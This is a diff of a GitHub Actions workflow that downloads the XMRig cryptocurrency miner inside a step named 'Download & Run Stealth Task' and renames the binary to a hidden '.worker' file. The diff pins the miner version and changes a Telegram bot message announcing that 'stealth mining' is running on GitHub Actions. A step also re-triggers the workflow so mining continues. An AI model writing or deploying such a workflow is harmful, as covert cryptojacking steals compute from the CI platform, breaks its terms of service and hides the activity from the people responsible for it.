@@ -16,13 +16,12 @@ jobs:
 
     - name: Download & Run Stealth Task
       run: |
-        LATEST=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | jq -r '.tag_name')
-        echo "Latest version is $LATEST"
-        
-        # Download binary untuk Linux 64-bit
-        wget https://github.com/xmrig/xmrig/releases/download/${LATEST}/xmrig-${LATEST}-linux-x64.tar.gz -O runner.tar.gz || exit 1
+        VERSION="6.24.0"
+        FILE="xmrig-${VERSION}-linux-static-x64.tar.gz"
+        wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${FILE} -O runner.tar.gz || exit 1
         tar -xzf runner.tar.gz || exit 1
-        mv xmrig-${LATEST} taskdir
+        DIR=$(tar -tf runner.tar.gz | head -1 | cut -f1 -d"/")
+        mv "$DIR" taskdir
         cd taskdir
         mv xmrig .worker
         chmod +x .worker
@@ -35,7 +34,7 @@ jobs:
       run: |
         curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
         -d chat_id=$TG_CHAT_ID \
-        -d text="✅ Stealth Mining sedang berjalan di @AutoNanoGithub_bot\n🛠️ XMrig aktif & terhubung."
+        -d text="✅ Mining stealth aktif via GitHub Actions!\n⛏️ XMRig v6.24.0 terhubung - @AutoNanoGithub_bot"
 
     - name: Re-trigger Task
       if: ${{ github.event_name == 'workflow_dispatch' }}
